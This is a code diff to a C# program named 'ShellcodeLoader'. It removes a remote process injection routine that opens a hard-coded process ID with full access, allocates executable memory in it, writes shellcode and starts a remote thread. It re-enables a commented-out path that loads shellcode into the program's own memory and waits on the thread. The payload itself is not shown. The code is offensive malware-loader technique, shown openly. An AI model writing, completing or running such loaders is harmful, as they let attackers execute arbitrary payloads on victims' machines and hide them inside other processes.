@@ -137,17 +137,8 @@ namespace ShellcodeLoader
         static void Main(string[] args)
         {
 
-            byte[] buf = getterShellcode();
+            byte[] shellcode = getterShellcode();
 
-            IntPtr hProcess = OpenProcess(0x001F0FFF, false, 4060);
-
-            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
-
-            IntPtr outSize;
-            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
-
-            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
-            /*// Allocate a region of memory in this process as RW
             var baseAddress = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ReadWrite);
 
             // Copy the shellcode into the memory region
@@ -163,7 +154,7 @@ namespace ShellcodeLoader
 
 
             // Wait infinitely on this thread to stop the process exiting
-            WaitForSingleObject(hThread, 0xFFFFFFFF);*/
+            WaitForSingleObject(hThread, 0xFFFFFFFF);
 
         }
     }
